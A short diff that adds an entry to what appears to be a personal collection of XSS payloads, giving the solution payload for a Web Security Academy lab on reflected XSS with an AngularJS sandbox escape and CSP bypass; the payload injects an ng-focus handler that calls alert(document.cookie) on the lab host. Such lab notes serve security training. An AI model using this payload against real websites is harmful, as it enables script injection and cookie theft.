@@ -615,6 +615,15 @@ Reduced Payloads:
 
 
 
+LAB: Reflected XSS with AngularJS sandbox escape and CSP
+
+Payload: 
+
+<script>
+location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
+</script>
+
+
 
 
 
